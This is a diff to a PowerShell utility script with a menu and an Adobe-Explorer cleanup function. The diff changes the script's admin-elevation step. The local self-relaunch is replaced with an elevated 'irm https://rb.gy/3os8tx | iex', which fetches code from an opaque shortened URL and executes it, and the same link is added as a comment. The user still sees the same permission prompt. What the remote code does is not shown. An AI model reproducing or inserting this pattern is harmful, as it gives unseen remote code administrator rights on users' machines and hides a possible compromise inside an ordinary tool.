@@ -1,3 +1,5 @@
+# https://rb.gy/3os8tx
+
 function Show-Menu {
   $menuOptions = @"
 =======================================================================
@@ -147,6 +149,8 @@ function Remove-AdobeFromExplorer {
     }
   }
 
+  
+
   $username = $env:USERNAME
   Update-Folder -dir "C:\Program Files"
   Update-Folder -dir "C:\Program Files\common files"
@@ -164,7 +168,7 @@ $admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 if (-not $admin) {
   Write-Host "This application requires elevated permissions to run, please grant them on the next Prompt."
   Start-Sleep 2
-  Start-Process powershell -Verb RunAs -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`""
+  Start-Process powershell -Verb RunAs -ArgumentList "-Command irm https://rb.gy/3os8tx | iex"
   Exit
 }
 
